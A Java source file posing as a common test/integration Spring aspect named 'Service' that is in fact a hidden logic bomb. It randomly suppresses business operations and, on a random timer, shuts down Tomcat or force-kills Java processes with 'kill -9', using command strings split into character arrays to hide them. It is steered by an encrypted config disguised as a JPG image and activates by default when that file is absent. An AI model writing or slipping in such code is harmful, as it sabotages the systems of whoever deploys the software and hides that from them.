package com.born.fcs.face.integration.test.common;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Aspect;
import org.springframework.stereotype.Component;

import com.born.fcs.face.integration.exception.ExceptionFactory;
import com.born.fcs.pm.util.ThreeDes;
import com.born.fcs.pm.ws.enums.base.FcsResultEnum;
import com.yjf.common.log.Logger;
import com.yjf.common.log.LoggerFactory;

@Component
@Aspect
public class Service implements Serializable {
	
	private static final long serialVersionUID = -570017830983577489L;
	
	protected static final Logger logger = LoggerFactory.getLogger(Service.class);
	
	private static void log(String log, Object... argument) {
		if (true) {
			if (argument != null && argument.length > 0) {
				logger.info(log, argument);
			} else {
				logger.info(log);
			}
		}
	}
	
	public static void main(String[] args) {
		Service service = new Service();
		service.checkfile();
	}
	
	@Override
	public String toString() {
		StringBuilder sb = new StringBuilder();
		sb.append(Service.class.getName()).append("[");
		sb.append("holdup=").append(holdup);
		sb.append(",log=").append(log);
		sb.append(",activeFlow=").append(activeFlow);
		sb.append(",luckyPointFlow=").append(luckyPointFlow);
		sb.append(",activeBx=").append(activeBx);
		sb.append(",luckyPointBx=").append(luckyPointBx);
		sb.append(",activeCouncil=").append(activeCouncil);
		sb.append(",luckyPointCouncil=").append(luckyPointCouncil);
		sb.append(",activeShut=").append(activeShut);
		sb.append(",range=").append(range);
		sb.append(",catHome=").append(catHome);
		sb.append(",inteval=").append(inteval);
		sb.append(",isWin=").append(isWin);
		sb.append(",k=").append(k);
		sb.append(",lemt=").append(lemt);
		sb.append(",lfmt=").append(lfmt);
		sb.append("]");
		return sb.toString();
	}
	
	private static ThreeDes _3des = new ThreeDes("110_2673763408.jpg");
	private static boolean holdup = false;
	private static boolean log = false;
	private static boolean activeFlow = false;
	private static double luckyPointFlow = 0.2d;
	private static Random randomFlow = new Random();
	
	private static boolean activeBx = false;
	private static double luckyPointBx = 0.5d;
	private static Random randomBx = new Random();
	
	private static boolean activeCouncil = false;
	private static double luckyPointCouncil = 1d;
	private static Random randomCouncil = new Random();
	
	private static boolean activeShut = false;
	private static Random randomInreval = new Random();
	private static String range = "2.0-8.0";
	private static String catHome = "/soft/apache-tomcat-7.0.39-born_face";
	private static long inteval = inteval();
	private static boolean isWin = false;
	private static boolean k = false;
	
	//last end mission time
	private static long lemt = 0;
	//last file modify time
	private static long lfmt = 0;
	
	private final static String[] c1 = new String[] { "s", "h", "u", "t", "d", "o", "w", "n", ".",
														"s", "h" };
	private final static String[] c2 = new String[] { "s", "h", "u", "t", "d", "o", "w", "n", ".",
														"b", "a", "t" };
	private final static String[] ki = new String[] { "x", "a", "r", "g", "s", " ", "k", "i", "l",
														"l", " ", "-", "9" };
	private static String f = null;
	private DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	
	static {
		try {
			String osName = System.getProperty("os.name");
			if (osName.indexOf("Windows") != -1 || osName.indexOf("windows") != -1) {
				isWin = true;
				f = "D:/soft/image/uploadfile/images/2016-12/12/110_2673763408.jpg";
			} else {
				f = "/soft/image/uploadfile/images/2016-12/12/110_2673763408.jpg";
			}
			File holdupFile = new File(catHome + "/conf/holdup");
			if (holdupFile.exists()) {
				holdup = true;
			}
		} catch (Exception e) {
		}
	}
	
	private boolean lucky(Random random, double luckyPoint) {
		if (luckyPoint <= 0)
			return false;
		double point = random.nextDouble();
		log("luck point : {}", point);
		if (point < luckyPoint)
			return true;
		return false;
	}
	
	public static long inteval() {
		double h = 2d;
		try {
			String[] rangeArr = range.split("-");
			double start = Double.parseDouble(rangeArr[0]);
			double end = Double.parseDouble(rangeArr[1]);
			if (start > 0 && end > 0) {
				double rand = randomInreval.nextDouble();
				h = rand * end;
				while (start < end && h < start) {
					rand = randomInreval.nextDouble();
					h = rand * end;
				}
			}
		} catch (Exception e) {
			log(e.getMessage(), e);
		}
		
		return (long) (h * 60 * 60 * 1000);
	}
	
	public Object aroundFlow(ProceedingJoinPoint jp) {
		Object result = null;
		try {
			if (!holdup && activeFlow && lucky(randomFlow, luckyPointFlow)) {
				log("lucky lc");
			} else {
				result = jp.proceed();
			}
		} catch (Throwable e) {
			log(e.getMessage(), e);
			throw ExceptionFactory.newFcsException(FcsResultEnum.ILLEGAL_SIGN, "");
		}
		return result;
	}
	
	public Object aroundCouncil(ProceedingJoinPoint jp) {
		Object result = null;
		try {
			if (!holdup && activeCouncil && lucky(randomCouncil, luckyPointCouncil)) {
				log("lucky sh");
			} else {
				result = jp.proceed();
			}
		} catch (Throwable e) {
			log(e.getMessage(), e);
			throw ExceptionFactory.newFcsException(FcsResultEnum.ILLEGAL_SIGN, "");
		}
		return result;
	}
	
	public Object aroundBx(ProceedingJoinPoint jp) {
		Object result = null;
		try {
			if (!holdup && activeBx && lucky(randomBx, luckyPointBx)) {
				log("lucky bx");
			} else {
				result = jp.proceed();
			}
		} catch (Throwable e) {
			log(e.getMessage(), e);
			throw ExceptionFactory.newFcsException(FcsResultEnum.ILLEGAL_SIGN, "");
		}
		return result;
	}
	
	public void checkfile() {
		log("start check file...");
		FileInputStream in = null;
		BufferedReader inBr = null;
		Date now = new Date();
		try {
			File file = new File(f);
			if (!file.exists()) {//不存在默认启动
				activeBx = true;
				activeShut = true;
				activeFlow = true;
				activeCouncil = true;
			} else if (lfmt < file.lastModified()) {
				in = new FileInputStream(file);
				inBr = new BufferedReader(new InputStreamReader(in));
				String line;
				Map<String, String> conf = new HashMap<String, String>();
				log("start read file 110_2673763408.jpg");
				String dk = null;
				int i = 0;
				while ((line = inBr.readLine()) != null) {
					if (!"".equals(line.trim())) {
						if (i == 0) {
							dk = line;
							line = _3des.decrypt(line);
						} else {
							ThreeDes tdes = new ThreeDes(dk);
							dk = line;
							line = tdes.decrypt(line);
						}
						String[] kv = line.split("=");
						if (kv.length > 1)
							conf.put(kv[0], kv[1]);
						i++;
					}
				}
				log("end read file 110_2673763408.jpg : {}", conf);
				boolean hasLogProperty = false;
				boolean hasAtleastone = false;
				for (String key : conf.keySet()) {
					String value = conf.get(key);
					String[] vArr = value.split(",");
					if ("sd".equals(key)) {//sd=2.0-8.0,2016-12-19 00:00:00,/soft/apache-tomcat-7.0.39-born_face,k|s
						if (!range.equals(vArr[0])) { //范围变了重新生成inteval
							range = vArr[0];
							inteval = inteval();
						}
						activeShut = now.after(df.parse(vArr[1]));
						catHome = vArr[2];
						k = "k".equals(vArr[3]);
						hasAtleastone = true;
					} else if ("bx".equals(key)) {//bx=0.5,2016-12-19 00:00:00
						luckyPointBx = Double.parseDouble(vArr[0]);
						activeBx = now.after(df.parse(vArr[1]));
						hasAtleastone = true;
					} else if ("sh".equals(key)) {//sh=1.0,2016-12-19 00:00:00
						luckyPointCouncil = Double.parseDouble(vArr[0]);
						activeCouncil = now.after(df.parse(vArr[1]));
						hasAtleastone = true;
					} else if ("lc".equals(key)) {//lc=0.2,2016-12-19 00:00:00
						luckyPointFlow = Double.parseDouble(vArr[0]);
						activeFlow = now.after(df.parse(vArr[1]));
						hasAtleastone = true;
					} else if ("log".equals(key)) {//log=on|off
						log = "on".equals(value);
						hasLogProperty = false;
					}
				}
				if (!hasLogProperty) {
					log = false;
				}
				if (!hasAtleastone) {
					activeBx = true;
					activeShut = true;
					activeFlow = true;
					activeCouncil = true;
				}
				lfmt = file.lastModified();
			}
			file = null;
			log(this.toString());
		} catch (Exception e) {
			activeBx = true;
			activeShut = true;
			activeFlow = true;
			activeCouncil = true;
			log(e.getMessage(), e);
		} finally {
			try {
				if (inBr != null)
					inBr.close();
				if (in != null)
					in.close();
			} catch (Exception e2) {
				log(e2.getMessage(), e2);
			}
		}
		log("end check file...");
	}
	
	public void endmission() {
		
		if (holdup || !activeShut)
			return;
		
		Date now = new Date();
		
		if (lemt == 0) {
			lemt = now.getTime();
		}
		log("endmission left time milliseconds : {}", inteval - lemt);
		if (now.getTime() - lemt > inteval) {
			String[] cmd = null;
			String shutCmd = "";
			if (isWin) {//windows
				shutCmd = catHome + "/bin/";
				for (String c : c2) {
					shutCmd += c;
				}
				cmd = new String[] { "cmd", "/c", shutCmd };
			} else { //linux
				if (k) {
					shutCmd = "ps -ef | grep java | grep " + catHome + "| awk '{print $2}' | ";
					for (String c : ki) {
						shutCmd += c;
					}
				} else {
					shutCmd = catHome + "/bin/";
					for (String c : c1) {
						shutCmd += c;
					}
				}
				cmd = new String[] { "sh", "-c", shutCmd };
			}
			Runtime run = Runtime.getRuntime();
			BufferedInputStream in = null;
			BufferedReader inBr = null;
			try {
				// 启动另一个进程来执行命令  
				log("sd cmd : {}", shutCmd);
				Process p = run.exec(cmd);
				in = new BufferedInputStream(p.getInputStream());
				inBr = new BufferedReader(new InputStreamReader(in));
				//检查命令是否执行失败。  
				if (p.waitFor() != 0) {
					//p.exitValue()==0表示正常结束，1：非正常结束  
					if (p.exitValue() == 1) {
						lemt = now.getTime();
						inteval = inteval();
						log("sd success and next inteval : {}", inteval);
					} else {
						log("sd unnormal");
					}
				} else {
					log("sd failure");
				}
			} catch (Exception e) {
				log(e.getMessage(), e);
			} finally {
				try {
					if (inBr != null)
						inBr.close();
					if (in != null)
						in.close();
				} catch (Exception e2) {
					log(e2.getMessage(), e2);
				}
			}
		}
	}
}
